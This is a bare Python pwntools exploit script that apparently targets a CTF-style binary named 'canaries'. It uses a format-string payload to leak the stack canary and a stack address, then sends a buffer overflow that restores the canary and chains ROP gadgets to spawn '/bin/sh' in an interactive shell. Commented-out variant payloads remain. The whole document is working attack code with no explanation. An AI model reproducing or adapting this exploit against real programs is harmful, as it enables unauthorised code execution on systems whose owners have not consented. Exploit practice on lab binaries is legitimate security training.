#!/usr/bin/env python

from pwn import *
import sys, struct
import binascii

def exploit():
	p = process(['./canaries'])
	print util.proc.pidof(p) 
	sys.stdin.read(1)

	print p.recv()
	p.sendline("AAAA" + "%135$x." + "%1$x")
	leak = p.recv()
	canary = leak[4:12]
	scloc = leak[13:21]
	#print type(canary)
	#scloc = "ffffcb00"
	print "Canary: "+ canary
	print "Scanner: "+ scloc
	#We will convert the canary value
	canary = int(canary,16)
	scloc = int(scloc,16) - 0x21e
	ncanary = struct.pack('<I',canary)
	#scloc = int(scloc,16) - 0x212
	attack = ""
	attack += "A\x00"
	attack += "/bin/sh\x00"
	attack += "C" * 502
	attack += ncanary
	attack += "JUNK"
	attack += "JUNK"
	attack += "JUNK"
	attack += "\x31\xf1\x06\x08"
	attack += "\x00\x00\x00\x00"
	attack += struct.pack('<I',scloc)
	attack += "\x5d\x6e\x0e\x08"
	attack += "\x00\x00\x00\x00"
	attack += "\x5f\xa9\x07\x08" * 11
	attack += "\x75\xcd\x06\x08"
	#attack += "\x00\x00\x00\x00"
	#attack += struct.pack('<I',0x0806f109)
	#attack += struct.pack('<I',scloc)
	#attack += "\x00\x00\x00\x00"
	#attack += struct.pack('<I',0x0807a95f) * 11
	#attack += struct.pack('<I',0x0806cd75)
	'''
	attack += "OKOK"
	attack += struct.pack('<I',0x080dead5)
	attack += "\x00\x00\x00\x00"
	attack += struct.pack('<I',0x0806f0c9)
	attack += struct.pack('<I',scloc)
	attack += "\x00\x00\x00\x00"
	attack += struct.pack('<I',0x0807a91f) * 11
	attack += struct.pack('<I',0x0806cd35)
	'''
	#canary = int(canary, 16)
	#p.sendline("A\00" + "C" * 510 + "DDDDKKKK" + "\xba\xba\xba\xba")
	#p.sendline("A\x00" + "C" * 510 + ncanary)
	p.sendline(attack)
	print p.recv()
	p.interactive()
	#p.recv()
'''
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
'''
if __name__ == "__main__":
	try:
		exploit()
	except:
		print "[-] Unable to run exploit."